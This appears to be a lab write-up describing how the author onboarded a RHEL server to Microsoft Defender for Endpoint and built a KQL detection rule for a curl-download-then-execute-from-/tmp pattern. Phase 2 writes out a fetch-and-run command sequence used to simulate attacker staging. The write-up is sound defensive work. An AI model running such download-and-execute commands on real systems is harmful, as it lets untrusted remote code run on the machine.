# Linux RCE Detection Lab – Microsoft Defender for Endpoint

## Overview

In this lab, I built a complete end-to-end detection workflow using:

* Azure Red Hat Enterprise Linux (RHEL 9.4)
* Microsoft Defender for Endpoint (MDE)
* KQL (Kusto Query Language)
* Custom Detection Rules

The goal was to simulate attacker-like behavior on a Linux server and then design a detection that automatically alerts when that behavior occurs.

This project demonstrates how defensive monitoring can be built intentionally rather than relying only on default alerts.

---

## Lab Environment

* Cloud Platform: Microsoft Azure
* OS: Red Hat Enterprise Linux 9.4
* Web Service: Apache (httpd)
* Security Platform: Microsoft Defender for Endpoint
* Detection Language: KQL

---

## Phase 1 – Onboarding Linux to Defender

I first onboarded the RHEL VM to Microsoft Defender for Endpoint.

Steps performed:

1. Transferred the onboarding script to the VM using `scp`
2. Installed the Microsoft package repository
3. Installed the Defender agent (`mdatp`)
4. Executed the onboarding script
5. Verified the device was registered
6. Enabled real-time protection

Verification command:

```bash
sudo mdatp health
```

Confirmed:

* `healthy: true`
* `licensed: true`
* `real_time_protection_enabled: true`

<p align="left">
  <img src="assets/Screenshot 2026-02-11 084630.png" width="700">
  <img src="assets/Screenshot 2026-02-12 104359.png" width="700">
</p>

At this stage, the Linux server was actively monitored by Microsoft Defender.

---

## Phase 2 – Simulating Suspicious Behavior

To mimic common attacker staging behavior, I executed the following commands:

```bash
curl http://example.com -o /tmp/update.sh
chmod +x /tmp/update.sh
bash /tmp/update.sh
```

This sequence simulates:

* Downloading content from an external source
* Writing a file into `/tmp`
* Making it executable
* Attempting to execute it

Although the file was harmless HTML, the behavioral pattern matches how attackers commonly stage and execute payloads on Linux systems.

---

## Phase 3 – Threat Hunting with KQL

After generating the behavior, I moved into Advanced Hunting in Microsoft Defender and wrote a KQL query to detect:

* A `curl` download to `/tmp`
* Followed by execution from `/tmp`
* Within a five-minute time window

Example correlation logic:

```kql
(DeviceProcessEvents
| where DeviceName contains "jc-redhat"
| where FileName == "curl"
| where ProcessCommandLine contains "/tmp/"
| project
    DeviceId,
    DeviceName,
    DownloadTime = Timestamp,
    DownloadCmd  = ProcessCommandLine
)
| join kind=inner (
    DeviceProcessEvents
    | where DeviceName contains "jc-redhat"
    | where ProcessCommandLine contains "/tmp/"
    | project
        DeviceId,
        DeviceName,
        Timestamp,
        ReportId,
        ExecTime = Timestamp,
        ExecFile = FileName,
        ExecCmd  = ProcessCommandLine
) on DeviceId
| where ExecTime between (DownloadTime .. DownloadTime + 5m)
| project
    DeviceId,
    Timestamp,      // REQUIRED for custom detection
    ReportId,       // REQUIRED for custom detection
    DeviceName,
    DownloadTime,
    ExecTime,
    DownloadCmd,
    ExecFile,
    ExecCmd
| sort by Timestamp desc
```

This query correlates download activity with execution behavior.

I validated the detection by rerunning the suspicious commands and confirming that the events were returned in Advanced Hunting.

<p align="left">
  <img src="assets/Screenshot 2026-02-11 134224.png" width="700">
  <img src="assets/Screenshot 2026-02-11 141606.png" width="700">
</p>

---

## Phase 4 – Converting the Hunt into a Detection Rule

Once validated, I converted the KQL query into a custom detection rule inside Microsoft Defender.

Configuration included:

* Required fields:

  * DeviceId
  * Timestamp
  * ReportId
* Severity set to High
* Category: Execution
* MITRE ATT&CK Technique: T1059 (Command and Scripting Interpreter)
* Scoped to the lab device group

<p align="left">
  <img src="assets/Screenshot 2026-02-11 144000.png" width="700">
  <img src="assets/Screenshot 2026-02-11 144015.png" width="700">
</p>

After deployment, the detection rule automatically generates an alert whenever this behavior occurs.

<p align="left">
  <img src="assets/Screenshot 2026-02-12 105020.png" width="700">
  <img src="assets/Screenshot 2026-02-12 105112.png" width="700">
</p>

---

## Conclusion

In this project, I simulated attacker-like behavior on a Linux server and built a detection to identify that behavior automatically.

I did not rely on default alerts. Instead, I:

* Generated suspicious activity intentionally
* Verified that endpoint telemetry captured it
* Designed correlation logic in KQL
* Converted that logic into a working detection rule
* Enabled automated alerting

This lab demonstrates how detection logic is built from behavior, validated against real telemetry, and operationalized into a functioning alert within Microsoft Defender for Endpoint.

It represents a complete defensive workflow:
Behavior → Log Collection → Query Development → Validation → Detection Rule → Alert Generation.
